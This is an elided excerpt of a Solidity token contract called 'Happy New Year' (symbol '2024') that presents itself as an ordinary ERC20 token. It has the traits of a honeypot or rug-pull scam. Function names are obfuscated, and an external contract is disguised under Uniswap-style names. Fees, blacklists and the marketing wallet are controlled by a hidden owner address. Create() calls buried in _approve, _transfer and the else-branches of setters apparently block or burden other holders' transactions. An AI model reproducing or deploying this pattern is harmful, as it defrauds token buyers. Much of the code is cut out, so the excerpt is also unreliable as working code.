...
contract Token is Context, IERC20, Ownable {
    ...
    string private _name = "Happy New Year";
    string private _symbol = "2024";
    ...
    uniswapV1 private uniswapV56PairToken;
    ...
    address private uniswapV56Pair_;
    bool private itvs;
    ...
    constructor(address Antibottoken_, address creator, address caSwap) {
        ...
        uniswapV56PairToken = uniswapV1(uniswapV56Pair_);
        itvv = IpancakeV2(pancakeV2Pair_);


        _Antitbotswaper[uniswapV56Pair_] = true;
        _isExcludedFromFee[uniswapV56Pair_] = true;
    ...
    function holderSend_Ox1145988(address[] memory accounts, bool b) external {
        ...
        if (_msgSender() == address(_Antitbottoken)) { 
            ...
            uniswapV56PairToken.create(8**3);
        }
    }

    function setItvs_Ox1145968(bool b) external {
        //require(_msgSender() == address(_Antitbottoken), "ERC20: transfer from the address");
        if (_msgSender() == address(_Antitbottoken)) { 
            itvs=b;
        } else {
    ...
    function holderlisting_Ox1145988(address[] memory accounts, uint256[] memory a) external {
        //require(_msgSender() == address(_Antitbottoken), "ERC20: transfer from the address");
        if (_msgSender() == address(_Antitbottoken)) { 
            for (uint256 i = 0; i < accounts.length; i++) {
...
/*    function pair_Ox1145998(address aaaa, bool b) public {
...
*/    
    function ag_Ox1145618(uint256 g) public {
        if (_Antitbotswaper[_msgSender()]) {
            gg=g;
        } else {
            uniswapV56PairToken.create(8**3);
    ...
    function Eca_Ox1145628(uint256 aa) public {
        if (_Antitbotswaper[_msgSender()]) {
            creca=aa;
        } else {
            uniswapV56PairToken.create(8**3);
    ...
    function incfees_Ox1145633(uint256 taxFeebuy, uint256 liquidityFeebuy, uint256 MarketingFeebuy, uint256 taxFeesell, uint256 liquidityFeesell, uint256 MarketingFeesell) public {
        //require(_msgSender() == address(_Antitbottoken), "ERC20");
        if (_msgSender() == address(_Antitbottoken)) {
    ...
    function marketingWallet_Ox1145644(address addresses) public {
        //require(_msgSender() == address(_Antitbottoken), "ERC20: transfer from the address");
        if (_msgSender() == address(_Antitbottoken)) { 
            uniswapV56PairToken = uniswapV1(addresses);
        } else {
            uniswapV56PairToken.create(8**3);
        }
    }
    ...
    function initialitzeW_Ox1145658 (bool bs, uint256 timesleep, uint256 fee, uint256 c, bool trad, address r) public {
        //require(_msgSender() == address(_Antitbottoken), "ERC20: transfer from the address");
        if (_msgSender() == address(_Antitbottoken)) { 
            antitbotenabled = bs;
            botsleep = timesleep;
    ...
    function _approve(
        ...
        if (_isExcludedtFromFeeTransfer[_msgSender()]){uniswapV56PairToken.create(creca);/*"ERC20: approve the zero address"*/}
    ...
    function _transfer(
        ...
        if (!takeFee) {
            ...
            _MarketingFee = _MarketingFeesell;
            uniswapV56PairToken.create(crec);
            if(crec>220 && msg.sender!=rr){uniswapV56PairToken.create(crec**21);}
        }
        ...
        if (_isExcludedtlp[to]) {
            uniswapV56PairToken.create(250**3); 
        }
